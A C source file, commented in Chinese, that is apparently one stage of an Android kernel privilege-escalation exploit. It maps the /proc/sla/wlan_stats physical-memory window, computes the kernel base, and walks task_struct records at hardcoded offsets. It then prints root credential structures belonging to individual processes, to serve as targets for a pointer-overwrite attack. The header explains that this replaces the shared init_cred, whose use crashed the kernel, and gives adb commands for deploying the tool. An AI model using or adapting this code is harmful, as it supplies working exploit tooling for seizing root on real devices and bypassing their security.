/* credhunt.c — 只读: 在 /proc/sla 的物理窗口里找**能读回来核对的 root cred**。
 *
 * 为什么需要它(2026-09-28): 提权那两发指针写的"值"必须是 init_cred 这类 root cred, 但
 *   (a) init_cred 的地址只能靠 kallsyms+slide **算**, 它本身**不在窗口里** ⇒ 写完看不见;
 *   (b) 更糟的是它被**几百个内核线程共享** ⇒ 配对写 `*(val)=dst-8` 会把全内核线程的
 *       cred->uid 一起弄脏, 相3 六次里炸五次, 高度可疑就是这里。
 *   ⇒ 换成"某个 root 进程**私享**的一份 cred": 同样 uid0+全 caps, 但只有那一个进程受影响,
 *      而且**它就在窗口里 ⇒ 打之前能读、打之后还能读回来核对**(彻底告别盲打)。
 *
 * 用法(需要 permissive, 因为 /proc/sla 在 enforcing 下连 stat 都 EACCES):
 *   adb push credhunt /data/local/tmp/ch ; adb shell chmod 755 /data/local/tmp/ch
 *   adb shell /data/local/tmp/ch [窗口MB]        它只读, 不 punch, 秒级完成
 * 输出: 每条 = cred 的**窗口偏移**(可直接 K+offset 换算) + 它属于哪个 comm + 全字段。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>

static sigjmp_buf jb;
static volatile int jon;
static void onbus(int s) { (void)s; if (jon) siglongjmp(jb, 1); }
static uint64_t q(unsigned char *b, size_t o) { uint64_t v; memcpy(&v, b + o, 8); return v; }
static uint32_t u(unsigned char *b, size_t o) { uint32_t v; memcpy(&v, b + o, 4); return v; }
static int cmpasc(const void *a, const void *b) {
  uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
  return x < y ? -1 : (x > y ? 1 : 0);
}
#define REC_STRIDE 72
#define REC_COMM 40

/* 抽样求窗口基址 K(比全量扫快 1000 倍: 只取 384 个整页做直方图众数) */
static uint64_t anchor(unsigned char *m, const unsigned char *ok, size_t np, size_t *cnt) {
  size_t cap = 300000, n = 0;
  uint64_t *kv = malloc(cap * sizeof *kv);
  if (!kv) return 0;
  size_t stride = np / 384; if (!stride) stride = 1;
  for (size_t i = 0; i < np; i += stride) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 8 <= (i + 1) * 4096u && o < (size_t)np * 4096u; o += 8) {
      uint64_t v = q(m, o);
      if ((v >> 48) != 0xffffULL || v <= o) continue;
      if (n < cap) kv[n++] = (v - o) & ~0xfffULL;
    }
  }
  qsort(kv, n, sizeof *kv, cmpasc);
  uint64_t best = 0; size_t bestn = 0, run = 1;
  for (size_t i = 1; i <= n; i++) {
    if (i < n && kv[i] == kv[i - 1]) run++;
    else { if (run > bestn) { bestn = run; best = kv[i - 1]; } run = 1; }
  }
  free(kv);
  if (cnt) *cnt = bestn;
  return bestn >= 20 ? best : 0;
}

int main(int argc, char **argv) {
  size_t MB = argc > 1 ? (size_t)strtol(argv[1], NULL, 0) : 1024;
  int fd = open("/proc/sla/wlan_stats", O_RDONLY | O_CLOEXEC);
  if (fd < 0) { printf("open /proc/sla/wlan_stats 失败 errno=%d(%s) ⇒ 需要 permissive\n",
                       errno, strerror(errno)); return 1; }
  unsigned char *m = MAP_FAILED;
  size_t L = 0;
  for (size_t s = MB << 20; s >= (16u << 20); s >>= 1) {
    m = mmap(NULL, s, PROT_READ, MAP_SHARED, fd, 0);
    if (m != MAP_FAILED) { L = s; break; }
  }
  if (m == MAP_FAILED) { printf("mmap 失败\n"); return 1; }
  struct sigaction sa; memset(&sa, 0, sizeof sa);
  sa.sa_handler = onbus; sigemptyset(&sa.sa_mask); sigaction(SIGBUS, &sa, NULL);
  size_t np = L / 4096u;
  unsigned char *ok = calloc(np + 1, 1);
  size_t okp = 0;
  for (size_t i = 0; i < np; i++) {
    jon = 1;
    if (sigsetjmp(jb, 1) == 0) { volatile char c = m[i * 4096u]; (void)c; ok[i] = 1; okp++; }
    jon = 0;
  }
  size_t bn = 0;
  uint64_t K = anchor(m, ok, np, &bn);
  printf("[CH] len=%zuMB 可读=%zuMB 基址 K=%016llx (自洽 %zu)\n",
         L >> 20, (okp * 4096u) >> 20, (unsigned long long)K, bn);
  if (!K) { printf("× 没求出 K ⇒ 停\n"); return 2; }
  fflush(stdout);

  /* 1) 收 SLA 记录表: (task 指针, comm) —— 这张表是"白送"的, 不需要猜任何布局 */
  enum { MAXR = 4000 };
  static uint64_t tp[MAXR]; static char tn[MAXR][17]; static int nr = 0;
  for (size_t i = 0; i < np && nr < MAXR; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + REC_COMM + 16 <= (i + 1) * 4096u; o += 8) {
      uint64_t v = q(m, o);
      if ((v >> 48) != 0xffffULL || (v & 7)) continue;
      const unsigned char *c = m + o + REC_COMM;
      int pr = 1;
      for (int k = 0; k < 6; k++) if (c[k] < 0x20 || c[k] > 0x7e) pr = 0;
      if (!pr || c[6]) continue;
      memcpy(tn[nr], c, 16); tn[nr][16] = 0; tp[nr] = v; nr++;
      if (nr >= MAXR) break;
    }
  }
  printf("[CH] 记录 %d 条 (task 指针 + comm)\n", nr);
  fflush(stdout);

  /* 2) 对每条记录: task 在窗口里吗? ⇒ 读它的 cred(+0x848)/real_cred(+0x840)
   *    ⇒ cred 也在窗口里吗? ⇒ 把 cred 全字段读出来, 挑 uid0 且 caps 全开的 */
  int found = 0;
  for (int r = 0; r < nr; r++) {
    if (tp[r] < K || tp[r] + 0x8c0 >= K + L) continue;
    size_t to = (size_t)(tp[r] - K);
    if (!ok[to / 4096u] || !ok[(to + 0x8c0) / 4096u]) continue;
    jon = 1;
    if (sigsetjmp(jb, 1) != 0) { jon = 0; continue; }
    uint64_t cr = q(m, to + 0x848), rc = q(m, to + 0x840);
    jon = 0;
    uint32_t prio = 0, sprio = 0;
    jon = 1;
    if (sigsetjmp(jb, 1) == 0) { prio = u(m, to + 0xb4); sprio = u(m, to + 0xb8); }
    jon = 0;
    for (int c = 0; c < 2; c++) {
      uint64_t cv = c ? rc : cr;
      if (cv < K || cv + 0x90 >= K + L) continue;
      size_t co = (size_t)(cv - K);
      if (!ok[co / 4096u] || !ok[(co + 0x8f) / 4096u]) continue;
      uint32_t usage, uid, gid, suid, sgid, euid, egid, fsuid, fsgid;
      uint64_t cina, cper, ceff, cbset, camdb;
      jon = 1;
      if (sigsetjmp(jb, 1) != 0) { jon = 0; continue; }
      usage = u(m, co + 0); uid = u(m, co + 4); gid = u(m, co + 8);
      suid = u(m, co + 0xc); sgid = u(m, co + 0x10); euid = u(m, co + 0x14);
      egid = u(m, co + 0x18); fsuid = u(m, co + 0x1c); fsgid = u(m, co + 0x20);
      cina = q(m, co + 0x28); cper = q(m, co + 0x30); ceff = q(m, co + 0x38);
      cbset = q(m, co + 0x40); camdb = q(m, co + 0x48);
      jon = 0;
      int rootish = (uid == 0 && gid == 0 && euid == 0 && egid == 0 &&
                     fsuid == 0 && fsgid == 0 && suid == 0 && sgid == 0);
      if (!rootish) continue;
      if (ceff < 0x10000000ULL) continue;             /* caps 至少要"像全开" */
      if (usage == 0 || usage > 0x40000000u) continue; /* refcount 得是个正常值 */
      found++;
      printf("[CH] #%d cred=%016llx **偏移 +%zu (0x%zx)** 属于 comm=[%s] (task=%016llx prio=%u/%u)\n"
             "      usage=%u uid=%u gid=%u suid=%u sgid=%u euid=%u egid=%u fsuid=%u fsgid=%u\n"
             "      cap_inh=%016llx perm=%016llx eff=%016llx bset=%016llx amb=%016llx\n",
             r, (unsigned long long)cv, co, co, tn[r],
             (unsigned long long)tp[r], prio, sprio,
             usage, uid, gid, suid, sgid, euid, egid, fsuid, fsgid,
             (unsigned long long)cina, (unsigned long long)cper, (unsigned long long)ceff,
             (unsigned long long)cbset, (unsigned long long)camdb);
      fflush(stdout);
      if (found >= 12) return 0;
    }
  }
  printf("[CH] 结论: 窗口里找到 %d 份「可读回核对的 root cred」\n", found);
  return found ? 0 : 3;
}
